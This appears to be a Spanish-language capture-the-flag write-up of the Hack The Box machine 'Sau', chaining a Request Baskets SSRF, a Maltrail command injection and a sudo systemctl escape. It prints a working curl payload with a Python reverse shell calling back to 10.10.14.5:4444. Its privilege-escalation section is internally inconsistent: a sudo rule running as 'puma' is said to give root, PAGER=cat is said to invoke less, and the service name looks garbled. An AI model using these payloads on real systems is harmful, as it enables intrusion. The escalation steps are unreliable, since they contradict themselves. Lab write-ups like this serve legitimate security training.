---
layout: writeup
title: "Hack The Box: Sau (Writeup)"
difficulty: "Easy"
os: "Linux"
target_ip: "10.10.11.224"
vectors: "Request Basket SSRF -> Maltrail RCE -> Systemctl PrivEsc"
summary: "Máquina Linux Easy basada en la vulnerabilidad SSRF de Request Baskets para pivotar a Maltrail (RCE) y escalar privilegios con sudo systemctl."
date: 2026-09-15
---

## 1. Reconocimiento & Escaneo de Puertos

Iniciamos con un escaneo Nmap para identificar servicios activos en la IP objetivo:

```bash
nmap -p- --min-rate 10000 10.10.11.224 -oN nmap_initial.txt
```

**Puertos Abiertos:**
- `22/tcp` - SSH (OpenSSH 8.2p1)
- `55555/tcp` - Request Baskets 1.2.1

## 2. Explotación (SSRF & RCE)

Al inspeccionar el servicio en el puerto `55555`, identificamos **Request Baskets v1.2.1**, el cual posee la vulnerabilidad **CVE-2023-27163** (SSRF).

Configuramos una cesta en Request Baskets redirigiendo hacia el puerto interno `80` (que no era accesible desde el exterior):

```http
POST /api/baskets/mybasket HTTP/1.1
Host: 10.10.11.224:55555

{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false}
```

A través de esta respuesta obtenemos acceso al servicio interno **Maltrail v0.54**, vulnerable a inyección de comandos en el parámetro `username` en la pantalla de login:

```bash
curl 'http://10.10.11.224:55555/mybasket/login' --data 'username=;python3+-c+"import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'
```

Recibimos una shell reversa como el usuario `puma`.

## 3. Escalación de Privilegios

Revisamos las reglas de `sudo`:

```bash
sudo -l
# (puma) NOPASSWD: /usr/bin/systemctl status status-systemd-journald-takeover.service
```

Al ejecutar `systemctl status` dentro de una terminal sin pager interactivo (`PAGER=cat`), `less` es invocado. Ejecutamos `!sh` dentro del visor de `less` para invocar una shell root.

```bash
sudo systemctl status status-systemd-journald-takeover.service
!sh
# id
# uid=0(root) gid=0(root) groups=0(root)
```

¡Máquina dominada! 🎯
